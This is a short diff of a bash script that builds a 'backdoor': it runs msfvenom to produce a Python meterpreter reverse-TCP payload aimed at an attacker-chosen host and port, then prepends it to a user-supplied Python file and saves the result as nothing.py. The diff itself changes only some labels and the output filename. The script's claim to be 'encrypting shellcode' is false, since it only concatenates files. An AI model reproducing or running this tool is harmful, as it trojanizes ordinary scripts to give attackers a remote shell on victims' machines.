@@ -13,20 +13,20 @@ echo ""
 sleep 0.5
 echo "[ * ] Generating the backdoor ..." | pv -qL 10
 echo ""
-xterm -T "Creating Payload ..." -e "msfvenom -p python/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -o temp.txt" & > /dev/null2>&1
+xterm -T "Creating Backdoor ..." -e "msfvenom -p python/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -o temp.txt" & > /dev/null2>&1
 PID=$!
 wait $PID
 sleep 1
 echo "[ # ] Encrypting shellcode ..." | pv -qL 10
 echo ""
-cat temp.txt > $(basename $pyfile)
-echo '' >> $(basename $pyfile)
-cat $pyfile >> $(basename $pyfile)
+cat temp.txt > nothing.py
+echo '' >> nothing.py
+cat $pyfile >> nothing.py
 sleep 0.5
 echo "[ + ] Shellcode encrypted ..." | pv -qL 10
 echo ""
 sleep 1
-echo "[ + ] backdoor saved in folder --> $PWD/$(basename $pyfile)" | pv -qL 10
+echo "[ + ] Backdoor saved in folder --> $PWD/nothing.py" | pv -qL 10
 echo ""
 sleep 1.5
 echo "[ + ] Cleaning up ... " | pv -qL 10
